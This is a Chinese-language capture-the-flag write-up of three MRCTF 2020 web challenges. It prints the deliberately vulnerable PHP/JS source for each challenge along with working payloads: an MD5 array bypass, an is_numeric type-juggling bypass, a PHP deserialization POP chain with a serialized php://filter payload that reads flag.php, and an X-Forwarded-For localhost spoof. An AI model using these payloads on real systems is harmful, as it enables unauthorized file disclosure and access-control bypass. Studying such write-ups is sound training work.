# MRCTF 2020

## Web

### Ez\_bypass

#### **题目**

```php
<?php
include 'flag.php';
$flag = 'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if (isset($_GET['gg']) && isset($_GET['id'])) {
  $id = $_GET['id'];
  $gg = $_GET['gg'];
  if (md5($id) === md5($gg) && $id !== $gg) {
    echo 'You got the first step';
    if (isset($_POST['passwd'])) {
      $passwd = $_POST['passwd'];
      if (!is_numeric($passwd)) {
        if ($passwd == 1234567) {
          echo 'Good Job!';
          highlight_file('flag.php');
          die('By Retr_0');
        } else {
          echo "can you think twice??";
        }
      } else {
        echo 'You can not get it !';
      }

    } else {
      die('only one way to get the flag');
    }
  } else {
    echo "You are not a real hacker!";
  }
} else {
  die('Please input first');
}
```

#### **MD5 绕过**

构造 payload `gg[]=1&&id[]=2` 进行绕过即可

#### **is\_numeric() 函数绕过**

构造 payload `passwd=1234567a` 进行绕过即可获得到 flag

### Ezpop

```php
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

#### 0x00 POP 链

```
Show::__construct()->Show::__toString()->Test::__get()->Modifier::__invoke()->Modifier::append
```

#### 0x01 构造序列化

```php
<?php
class Modifier {
  protected  $var;

  public function setVar($var){
    $this->var = $var;
  }
  public function append($value){
    include($value);
  }
  public function __invoke(){
    $this->append($this->var);
  }
}

class Show{
  public $source;
  public $str;
  public function __construct($file='index.php'){
    $this->source = $file;
    echo 'Welcome to '.$this->source."<br>";
  }
  public function __toString(){
    echo '1';
    return $this->str->source;
  }

  public function __wakeup(){
    if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
      echo "hacker";
      $this->source = "index.php";
    }
  }
}

class Test{
  public $p;
  public function __construct(){
    $this->p = array();
  }

  public function __get($key){
    $function = $this->p;
    return $function();
  }
}

$a = new Show();
$b = new Show();
$c = new Test();
$d = new Modifier();

$a->source = $b;
$b->str = $c;
$c->p = $d;
$d->setVar('php://filter/read=convert.base64-encode/resource=flag.php');

echo urlencode(serialize($a));
// O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```

构造 Payload 如下

```
pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```

将回显进行 base64 解码后即可获得 flag 。

### PYWebsite

查看源代码存在一串神秘 JS

```js
function enc(code){
	hash = hex_md5(code);
	return hash;
}
function validate(){
	var code = document.getElementById("vcode").value;
    if (code != ""){
    	if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
        	alert("您通过了验证！");
            window.location = "./flag.php"
        }else{
          alert("你的授权码不正确！");
        }
    }else{
        alert("请输入授权码");
    }
}
```

进入到 `./flag` 后回显提示 `除了购买者和我自己，没有人可以看到flag` ，那就试试改下 `X-Forwarded-For: 127.0.0.1` ，再查看源代码就可以发现 flag 了。
